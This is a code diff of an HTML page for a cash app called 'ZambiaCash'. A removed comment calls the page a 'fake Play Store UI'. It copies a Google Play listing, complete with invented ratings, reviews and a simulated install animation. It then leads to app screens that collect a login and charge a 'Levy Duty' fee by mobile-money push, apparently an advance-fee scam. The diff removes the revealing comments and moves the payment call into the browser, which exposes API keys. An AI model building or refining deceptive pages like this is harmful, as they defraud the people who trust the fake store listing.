@@ -50,7 +50,6 @@
         
         #download-ring { transition: stroke-dashoffset 0.1s linear; }
 
-        /* Native Android Toast Animation */
         @keyframes toastIn { from { opacity: 0; transform: translate(-50%, 20px); } to { opacity: 1; transform: translate(-50%, 0); } }
         @keyframes toastOut { from { opacity: 1; transform: translate(-50%, 0); } to { opacity: 0; transform: translate(-50%, 20px); } }
         .native-toast { animation: toastIn 0.3s ease-out forwards; }
@@ -59,12 +58,10 @@
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
-    <!-- NATIVE ANDROID TOAST -->
     <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[14px] px-5 py-3 rounded-full shadow-lg text-center font-medium whitespace-nowrap">
         Message goes here
     </div>
 
-    <!-- 0. OFFLINE GATE -->
     <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
         <div class="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
             <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path></svg>
@@ -79,7 +76,6 @@
         </button>
     </div>
 
-    <!-- 1. IN-APP BROWSER WARNING -->
     <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
         <div class="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
             <svg class="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
@@ -92,25 +88,20 @@
         <button onclick="copyLink()" class="w-full max-w-xs bg-slate-800 text-white font-bold py-3.5 rounded-xl border border-slate-700 font-sans">Copy Link</button>
     </div>
 
-    <!-- 2. FAKE PLAY STORE UI -->
     <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
         
-        <!-- Top Bar -->
         <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10">
             <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
             <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
         </div>
 
         <div class="p-5 max-w-lg mx-auto">
-            <!-- App Header with Ring OUTSIDE the icon -->
             <div class="flex gap-4 mb-6">
                 <div class="relative w-[104px] h-[104px] flex-shrink-0 flex items-center justify-center">
-                    <!-- Ring SVG -->
                     <svg id="ring-svg" class="hidden w-full h-full transform -rotate-90 absolute inset-0 z-10">
                         <circle cx="52" cy="52" r="48" stroke="#F1F5F9" stroke-width="5" fill="none" />
                         <circle id="download-ring" cx="52" cy="52" r="48" stroke="#0056D2" stroke-width="5" fill="none" stroke-dasharray="301.59" stroke-dashoffset="301.59" stroke-linecap="round"/>
                     </svg>
-                    <!-- Main Icon (Centered inside the container, leaving a gap for the ring) -->
                     <img src="icon.png" id="main-app-icon" class="w-[88px] h-[88px] rounded-2xl shadow-soft border border-gray-100 object-cover transition-all duration-300 z-0" alt="ZambiaCash Icon">
                 </div>
                 
@@ -121,7 +112,6 @@
                 </div>
             </div>
 
-            <!-- DOWNLOAD TEXT (Below header) -->
             <div id="download-text" class="hide mb-4">
                 <span id="download-percent" class="text-sm font-semibold text-gray-700">0% of 10 MB</span>
                 <div class="flex items-center gap-1 mt-1 text-playGreen">
@@ -130,26 +120,20 @@
                 </div>
             </div>
 
-            <!-- BUTTONS: INSTALL STATE -->
             <div class="flex gap-2 mb-6" id="pre-install-buttons">
                 <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
             </div>
 
-            <!-- BUTTONS: DOWNLOADING STATE -->
             <div class="flex gap-2 mb-6 hide" id="downloading-buttons">
                 <button onclick="cancelDownload()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200 active:scale-95 transition-transform">Cancel</button>
                 <button disabled class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full cursor-not-allowed">Open</button>
             </div>
 
-            <!-- BUTTONS: POST-INSTALL STATE -->
             <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
                 <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-3 rounded-full border border-gray-300 active:scale-95 transition-transform">Uninstall</button>
                 <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full shadow-sm active:scale-95 transition-transform">Open</button>
             </div>
 
-            <!-- ============================================== -->
-            <!-- POST-INSTALL SECTIONS (Shown after install)    -->
-            <!-- ============================================== -->
             <div id="post-install-content" class="hide">
                 <div class="mb-8 border-t border-gray-100 pt-6">
                     <div class="flex justify-between items-center mb-2">
@@ -166,7 +150,6 @@
                     </ul>
                 </div>
 
-                <!-- INTERACTIVE RATE THIS APP -->
                 <div class="mb-8 border-t border-gray-100 pt-8">
                     <h3 class="font-bold text-xl mb-1 text-gray-900">Rate this app</h3>
                     <p class="text-sm text-gray-500 mb-6">Tell others what you think</p>
@@ -181,11 +164,7 @@
                 </div>
             </div>
 
-            <!-- ============================================== -->
-            <!-- PRE-INSTALL CONTENT (Always visible for scrolling) -->
-            <!-- ============================================== -->
             <div id="pre-install-content">
-                <!-- Stats Row (Hidden when installed) -->
                 <div class="flex justify-between items-center text-center py-5 mb-6 border-y border-gray-100" id="stats-row">
                     <div class="flex-1 flex flex-col items-center">
                         <div class="flex items-center gap-1">
@@ -206,7 +185,6 @@
                     </div>
                 </div>
 
-                <!-- Screenshots -->
                 <div class="flex gap-4 overflow-x-auto hide-scrollbar mb-8 pb-4 snap-x">
                     <div class="w-44 h-80 bg-gradient-to-br from-brandBlue to-brandLight rounded-2xl flex-shrink-0 p-5 flex flex-col justify-between shadow-soft snap-center">
                         <div>
@@ -241,7 +219,6 @@
                     </div>
                 </div>
 
-                <!-- About App -->
                 <div class="mb-8">
                     <div class="flex items-center justify-between mb-3">
                         <h3 class="font-bold text-xl text-gray-900">About this app</h3>
@@ -256,7 +233,6 @@
                     </div>
                 </div>
 
-                <!-- Data Safety -->
                 <div class="mb-8 border-t border-gray-100 pt-8">
                     <div class="flex items-center justify-between mb-3">
                         <h3 class="font-bold text-xl text-gray-900">Data safety</h3>
@@ -295,14 +271,12 @@
                     </div>
                 </div>
 
-                <!-- Sponsored Section -->
                 <div class="mb-8 border-t border-gray-100 pt-8">
                     <div class="flex justify-between items-center mb-4">
                         <h3 class="font-bold text-xl text-gray-900">Sponsored <span class="font-normal text-gray-500 text-sm mx-1">•</span> Suggested for you</h3>
                         <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path></svg>
                     </div>
                     <div class="space-y-5">
-                        <!-- Kilimall -->
                         <div class="flex items-center gap-4">
                             <div class="w-16 h-16 bg-[#FF6600] rounded-2xl flex items-center justify-center text-white flex-shrink-0 shadow-sm">
                                 <span class="font-extrabold text-3xl italic tracking-tighter">K</span>
@@ -315,7 +289,6 @@
                                 </div>
                             </div>
                         </div>
-                        <!-- SportPesa -->
                         <div class="flex items-center gap-4">
                             <div class="w-16 h-16 bg-[#008800] rounded-2xl flex items-center justify-center text-white flex-shrink-0 shadow-sm">
                                 <svg class="w-10 h-10" viewBox="0 0 24 24" fill="currentColor">
@@ -330,7 +303,6 @@
                                 </div>
                             </div>
                         </div>
-                        <!-- Bolt Food -->
                         <div class="flex items-center gap-4">
                             <div class="w-16 h-16 bg-[#34D186] rounded-2xl flex items-center justify-center text-white flex-shrink-0 shadow-sm">
                                 <svg class="w-10 h-10" viewBox="0 0 24 24" fill="currentColor">
@@ -348,7 +320,6 @@
                     </div>
                 </div>
 
-                <!-- Ratings and Reviews Section -->
                 <div class="border-t border-gray-100 pt-8 mb-8">
                     <div class="flex items-center justify-between mb-4">
                         <h3 class="font-bold text-xl text-gray-900">Ratings and reviews</h3>
@@ -356,7 +327,6 @@
                     </div>
                     <p class="text-xs text-gray-500 mb-5 leading-relaxed">Ratings and reviews are verified and are from people who use the same type of device that you use.</p>
                     
-                    <!-- Bar Chart -->
                     <div class="flex gap-4 items-center mb-8">
                         <div class="flex flex-col items-center">
                             <span class="text-5xl font-light text-gray-900">4.6</span>
@@ -393,7 +363,6 @@
                         </div>
                     </div>
 
-                    <!-- Individual Reviews -->
                     <div class="space-y-7">
                         <div>
                             <div class="flex items-center gap-3 mb-2">
@@ -438,7 +407,6 @@
                     <button class="text-playBlue font-semibold text-sm mt-4">See all reviews</button>
                 </div>
 
-                <!-- App Support & Developer -->
                 <div class="border-t border-gray-100 pt-8 mb-8">
                     <div class="flex items-center justify-between mb-4">
                         <h3 class="font-bold text-xl text-gray-900">App support</h3>
@@ -473,7 +441,6 @@
                     </div>
                 </div>
 
-                <!-- Similar Apps -->
                 <div class="border-t border-gray-100 pt-8 mb-8">
                     <div class="flex items-center justify-between mb-4">
                         <h3 class="font-bold text-xl text-gray-900">Similar apps</h3>
@@ -499,10 +466,8 @@
                 </div>
 
             </div>
-
         </div>
 
-        <!-- BOTTOM NAVIGATION BAR -->
         <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex justify-around py-2.5 z-50 pb-safe">
             <div class="flex flex-col items-center text-gray-500">
                 <svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
@@ -521,7 +486,6 @@
         </div>
     </div>
 
-    <!-- 3. APP SCREENS -->
     <div id="app-content" class="hide font-sans">
 
         <div id="screen-login" class="screen active gradient-bg p-6">
@@ -658,9 +622,6 @@
         </div>
     </div>
 
-    <!-- ============================================== -->
-    <!-- APP LOGIC & ALL REQUIRED API KEYS              -->
-    <!-- ============================================== -->
     <script>
         const SUPABASE_URL = "https://zpcbfaydgbhpjqsgfluv.supabase.co";
         const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
@@ -686,7 +647,6 @@
             return d.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
         };
 
-        // NATIVE ANDROID TOAST LOGIC
         let toastTimeout;
         function showAndroidToast(message) {
             const toast = document.getElementById('android-toast');
@@ -745,15 +705,10 @@
             downloadingButtons.classList.add('hide');
             downloadText.classList.add('hide');
             ringSvg.classList.add('hidden');
+            statsRow.classList.add('hide'); 
             
-            // Hide stats row to match native installed view
-            statsRow.classList.add('hide');
-            
-            // Show What's new and Rate this app
             postInstallContent.classList.remove('hide');
-            
-            // Make sure main content (screenshots, reviews) remains visible for scrolling
-            preInstallContent.classList.remove('hide');
+            preInstallContent.classList.remove('hide'); 
 
             postInstallButtons.classList.remove('hide');
         }
@@ -763,14 +718,9 @@
             downloadingButtons.classList.add('hide');
             downloadText.classList.add('hide');
             ringSvg.classList.add('hidden');
+            statsRow.classList.remove('hide'); 
             
-            // Show stats row
-            statsRow.classList.remove('hide');
-            
-            // Hide What's new and Rate this app
             postInstallContent.classList.add('hide');
-            
-            // Show main content
             preInstallContent.classList.remove('hide');
 
             preInstallButtons.classList.remove('hide');
@@ -797,12 +747,11 @@
             downloadingButtons.classList.remove('hide');
             downloadText.classList.remove('hide');
             ringSvg.classList.remove('hidden');
-            // Keep preInstallContent visible so user can scroll
 
             const duration = 30000; 
             downloadStartTime = Date.now();
             isDownloading = true;
-            const circumference = 301.59; // 2 * PI * 48
+            const circumference = 301.59; 
 
             downloadInterval = setInterval(() => {
                 const elapsed = Date.now() - downloadStartTime;
@@ -818,7 +767,6 @@
                     isDownloading = false;
                     setTimeout(() => {
                         showInstalledState();
-                        // Silent swap, no toast
                     }, 500);
                 }
             }, 100);
@@ -847,9 +795,7 @@
 
         document.getElementById('btn-open-app').addEventListener('click', () => {
             showAndroidToast("Opening ZambiaCash...");
-            
             playStoreGate.classList.add('hide');
-            
             try { window.close(); } catch (e) {}
             const isAndroid = /android/i.test(navigator.userAgent);
             if (isAndroid) {
@@ -861,16 +807,10 @@
             }
         });
 
-        // Uninstall logic - NO POPUPS, silent reset
         window.mockUninstall = function() {
             showInstallState();
         };
 
-        window.addEventListener('appinstalled', () => {
-            // Silent
-        });
-
-        // INTERACTIVE STAR RATING
         window.setRating = function(rating) {
             const stars = document.querySelectorAll('.rate-star');
             stars.forEach((star, index) => {
@@ -1013,10 +953,12 @@
             localStorage.setItem('zc_user', JSON.stringify(state));
 
             try {
-                const res = await fetch(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
+                // DIRECT PALPLUSS API CALL (Bypassing Supabase Edge Function)
+                const auth = btoa(`${PALPLUSS_API_KEY}:`);
+                const res = await fetch("https://api.palpluss.com/v1/payments/stk", {
                     method: 'POST',
                     headers: {
-                        'Authorization': `Bearer ${SUPABASE_KEY}`,
+                        'Authorization': `Basic ${auth}`,
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
@@ -1045,7 +987,7 @@
                 startPolling(txnId);
 
             } catch (err) {
-                alert("Payment Error: " + err.message);
+                alert("Payment Error: " + err.message + "\n\nIf it says 'Failed to fetch', Palpluss blocks browser requests and you MUST use the Supabase Edge Function.");
                 document.getElementById('btn-pay').innerText = `Pay ${format(state.levy)} Levy Duty`;
                 document.getElementById('btn-pay').disabled = false;
             }
